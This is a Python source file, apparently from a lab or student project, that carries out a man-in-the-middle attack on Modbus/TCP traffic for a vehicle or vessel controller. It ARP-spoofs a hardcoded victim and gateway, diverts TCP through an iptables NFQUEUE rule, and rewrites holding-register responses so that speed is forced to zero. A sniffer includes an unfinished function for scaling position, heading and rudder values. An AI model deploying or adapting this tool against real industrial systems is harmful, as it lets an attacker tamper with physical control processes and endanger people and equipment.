import scapy.all as scapy 
import threading
from scapy.layers.inet import TCP
from scapy.contrib.modbus import *
import netfilterqueue as nfq
from scapy.layers.inet import IP, TCP
import os
from multiprocessing import Process, Event

class mb:

    func_meanings = {
        1: "Read Coils",
        2: "Read Discrete Inputs",
        3: "Read Holding Registers",
        4: "Read Input Registers",
        5: "Write Single Coil",
        6: "Write Single Register",
        15: "Write Multiple Coils",
        16: "Write Multiple Registers"
    }

    register_meanings = {
        3: "Speed Feedback",    # 12-bit count (X/4095)*5.0
        4: "Rudder Feedback",   # 12-bit count (X/4095)*30
        10: "X Position",       # meters*100
        11: "Y Position",       # meters*100
        12: "Theta (Heading)"   # milli-radians
    }

    def is_modbus(pkt):
        return pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)


    # If packet is speed and rudder. This is the useful one to mod
    def is_commands(pkt):
        if not mb.is_modbus(pkt):
            return False
        return pkt.haslayer("Read Holding Registers Response")

    def get_commands(pkt):
        if not mb.is_commands(pkt):
            return "?"
        mbl = pkt.getlayer(ModbusADUResponse)
        pl = getattr(mbl, "payload", "?")
        return getattr(pl, "registerVal", "?")
    
    def get_speed(pkt):
        return mb.get_commands(pkt)[0]

    def set_speed(pkt, new):
        if not mb.is_commands(pkt):
            return False
        mbl = pkt.getlayer(ModbusADUResponse)
        pl = getattr(mbl, "payload", "?")
        rv = getattr(pl, "registerVal", "?")
        rv[0] = new
        setattr(pl, "registerVal", rv)
        return pkt

    def get_rudder(pkt):
        return mb.get_commands(pkt)[1]

    def set_rudder(pkt, new):
        if not mb.is_commands(pkt):
            return False
        mbl = pkt.getlayer(ModbusADUResponse)
        pl = getattr(mbl, "payload", "?")
        rv = getattr(pl, "registerVal", "?")
        rv[1] = new
        setattr(pl, "registerVal", rv)
        return pkt




    # If packet is coords (xyt). This is the useful one to mod
    def is_coord(pkt):
        if not mb.is_modbus(pkt):
            return False
        if pkt.haslayer("Write Single Register"):
            return True

    def get_coord(pkt):
        if not mb.is_coord(pkt):
            return "?"
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        return getattr(pl, "registerValue", "?")

    def set_coords(pkt, new):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        setattr(pl, "registerValue", new)
        return pkt
    
    def is_x(pkt):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        if getattr(pl, "registerAddr", "?") == 10:
            return True
        else:
            return False

    def is_y(pkt):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        if getattr(pl, "registerAddr", "?") == 11:
            return True
        else:
            return False

    def is_theta(pkt):
        if not mb.is_coord(pkt):
            return False
        mbl = pkt.getlayer(ModbusADURequest)
        pl = getattr(mbl, "payload", "?")
        if getattr(pl, "registerAddr", "?") == 12:
            return True
        else:
            return False


    def get_transId(pkt):
        if not mb.is_modbus(pkt):
            return "?"
        mbl = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)
        return getattr(mbl, "transId", "?")




    def print_scannable(pkt, show_transId = False, show_x = True, show_y = True, show_theta = True, show_speed = True, show_rudder = True, convert = False):

        if not mb.is_modbus(pkt):
            return

        out = ""

        if show_transId:
            out += mb.get_transId(pkt)
        
        if show_x:
            out += "X:"
            if mb.is_x(pkt):
                x = mb.get_coord(pkt)
                if convert:
                    x = x/100.0
                    out += f"{x:>6.2f}"
                else:
                    out += f"{x:>6}"
            else:
                out += " "*6

        if show_y:
            out += "  Y:"
            if mb.is_y(pkt):
                y = mb.get_coord(pkt)
                if convert:
                    y = y/100.0
                    out += f"{y:>6.2f}"
                else:
                    out += f"{y:>6}"
            else:
                out += " "*6

        if show_theta:
            out += "  Theta:"
            if mb.is_theta(pkt):
                t = mb.get_coord(pkt)
                if convert:
                    t = (t/100.0)
                    out += f"{t:>6.2f}"
                else:
                    out += f"{t:>6}"
            else:
                out += " "*6
        
        if show_speed:
            out += "  Speed:"
            if mb.is_commands(pkt):
                s = mb.get_speed(pkt)
                if convert:
                    s = (s/4095.0) * 5.0
                    out += f"{s:>6.4f}"
                else:
                    out += f"{s:>6}"
            else:
                out += " "*6

        if show_rudder:
            out += "  Rudder:"
            if mb.is_commands(pkt):
                r = mb.get_rudder(pkt)
                if convert:
                    r = (r/4095.0) * 30.0
                    out += f"{r:>2.3}"
                else:
                    out += f"{r:>6}"
            else:
                out += " "*6

        print(out)


    
    '''
    useful pkt info:
    pkt.summary()
    modbus_layer.funcCode
    modbus_layer.payload
    '''

class net_filter_queue:

    def packet_listener(packet):
    
    
        pl=IP(packet.get_payload())

        #print('source IP:',pl[IP].src)
        #print('Destination IP', pl[IP].dst)
        #print('raw:',bytes(pl))

                    
                        
        
        # if  pl.haslayer("Write Single Register"): 
        #     print("Write register cache is:", pl['Write Single Register'].raw_packet_cache)  
        #     print("Write register is:", pl['Write Single Register'])
        if mb.is_commands(pl):
            
            pl = mb.set_speed(pl, 0)

        if mb.is_modbus(pl):

            mb.print_scannable(pl, convert=True)
        
        # elif pl.haslayer("Read Holding Registers Response"):
        #     print("Register response is:", pl['Read Holding Registers Response'].registerVal)
        #     print('Original payload is ',pl['Read Holding Registers Response'].registerVal)
        # #pload2=list(bytes(pl['Read Holding Registers Response'].registerVal))
        #     pload2=pl['Read Holding Registers Response'].registerVal
        
        #     pload2[0]=7
        #     print('payload2 is ',pload2)
        # #pl['Write Single Register'].remove_payload
        #     pl['Read Holding Registers Response'].registerVal=pload2
        #     print('the new payload is ',pl['Read Holding Registers Response'].registerVal)


        del pl[TCP].chksum
        del pl[IP].chksum
        # packet.set_payload(bytes(pl))

        #     #packet.drop()
        #     pl.show() 
            
      
        
        #pl.show()  
        scapy.send(pl)
        packet.accept()
            
            
                
            

        #print('plllllllllllllllllllllllll')

        

        #print(packet)
        
        #packet.accept()
    def __setdown():
        os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 

    def start():

        os.system("sudo iptables -t mangle -A PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1")
        os.system("sudo iptables -L")
        queue = nfq.NetfilterQueue()

        queue.bind(1, net_filter_queue.packet_listener)



        try:
            print("Starting Attack")
            # Check for net_filter_queue.running before each loops
            queue.run()
        except KeyboardInterrupt:
            net_filter_queue.__setdown()
            print("stopping sniffing")
            queue.unbind()

    def dstart():
        p = Process(target=net_filter_queue.start_worker, daemon=True)
        p.start()

    def dstop():
        net_filter_queue.running = False

class scapy_sniffing:

    # Modify packets according to inputs: mult & offset: default to 1x mult, +0 offset
    # Don't work yet
    def modify(pkt, matrix = [[1,0], [1,0], [1,0], [1,0], [1,0]]):
        if (not pkt.haslayer(ModbusADURequest) and not pkt.haslayer(ModbusADUResponse)):
            return pkt
        modbus_layer = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)
        pdu = getattr(modbus_layer, "payload", "?")
        
        # Response: speed & rudder: alter this
        if pkt.haslayer(ModbusADUResponse) and getattr(pdu, "funcCode", "?") == 3:
            register_value = getattr(pdu, "registerVal", "?")
            if register_value == "?":
                return pkt
            register_value[0] = int(register_value[0])*matrix[3][0] + matrix[3][1]
            register_value[1] = int(register_value[1])*matrix[4][0] + matrix[4][1]
            return pkt

        # Position data: alter based on register addr
        if getattr(modbus_layer, "funcCode", "?") == 6:
            register_addr = getattr(pdu, "registerAddr", "?")
            register_value = getattr(pdu, "registerValue", "?")
            if register_addr == "?" or register_value == "?":
                return pkt
            # X
            if register_addr == 10:
                register_value = int(register_value)*matrix[0][0] + matrix[0][1]
            # Y
            elif register_addr == 11:
                register_value = int(register_value)*matrix[1][0] + matrix[1][1]
            # Theta
            elif register_addr == 12:
                register_value = int(register_value)*matrix[2][0] + matrix[2][1]
            return pkt
            
        
        # Recalculate fields
        if pkt.haslayer(ModbusADURequest):
            del pkt[ModbusADURequest].len
        if pkt.haslayer(ModbusADUResponse):
            del pkt[ModbusADUResponse].len

        del pkt[TCP].chksum

        return pkt
        
    def start():
        def handle_packet(pkt):
            # Modbus/TCP runs over TCP port 502
            if pkt.haslayer(TCP) and (pkt[TCP].sport == 502 or pkt[TCP].dport == 502):
                if mb.is_modbus(pkt):
                    mb.print_scannable(pkt, convert=True)
                    # print(packet_sniffing.get_packet_info(pkt)["modbus_summary"]) # Detailed lines
            
                    # scapy.send(packet_sniffing.modify(pkt, [[0,0], [0,0], [0,0], [0,0], [0,0]]), verbose=False)

        # Sniff live traffic (adjust iface if needed)
        scapy.sniff(
            filter="tcp port 502",
            prn=handle_packet,
            store=False
        )

class arp_spoofing:

    def get_mac1(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbos = False)[0]
        return answered_list[0][1].hwsrc

    def get_mac(ip):
        '''return MAC address of any device connected to the network
        If ip is down return None'''
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/ arp_request
        answered_list, _ = scapy.srp(arp_request_broadcast, timeout=5)
        if answered_list:
            return answered_list[0][1].src


    def spoof(target_ip, spoof_ip, verbose=True):
        '''
        Spoofs 'target_ip' saying that we are host_ip'''

        packet = scapy.ARP(op='is-at', pdst=target_ip, hwdst = arp_spoofing.get_mac(target_ip), psrc = spoof_ip)
        # arp_spoofing.saved_packets.append(packet.summary())
        # print("PACKET PACKET YUP\n\n")
        # packet.show()
        # print("\n\nPACKET PACKET YUP")
        scapy.send(packet, verbose = False)
        if verbose:
            #get the MAC address of the default interface we are using
            self_mac = scapy.ARP().hwsrc  
            # print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))

    def restore(destination_ip, source_ip):
        destination_mac = arp_spoofing.get_mac(destination_ip)
        source_mac = arp_spoofing.get_mac(source_ip)
        packet = scapy.ARP(op = 2, pdst=destination_ip,
                hwdst = destination_mac,
                psrc = source_ip, hwsrc = source_mac)
        scapy.send(packet, verbose = False)



    def start():
        # Stop printing so much
        conf.verb = 0
        
        arp_spoofing.running = True

        # Initialize saved packets
        arp_spoofing.saved_packets = []
        
        #victom ip address
        arp_spoofing.target = '192.168.8.137'

        #gateway ip
        arp_spoofing.host = '192.168.8.243'

        # True = print, False = no print
        arp_spoofing.verbose = False

        def interval():
            if arp_spoofing.running:
                #Telling the target that we are the host
                arp_spoofing.spoof(arp_spoofing.target, arp_spoofing.host, arp_spoofing.verbose)

                # Telling the host that we are the target
                arp_spoofing.spoof(arp_spoofing.host, arp_spoofing.target, arp_spoofing.verbose)

                # rerun in a second
                timer = threading.Timer(1.0, interval)
                timer.start()
        interval()
                
    def stop():

        print("[!] Detexcted CTRL+C! restoring the network, please wait")

        # print(arp_spoofing.saved_packets)

        arp_spoofing.running = False

        arp_spoofing.restore(arp_spoofing.target, arp_spoofing.host)
        arp_spoofing.restore(arp_spoofing.host, arp_spoofing.target)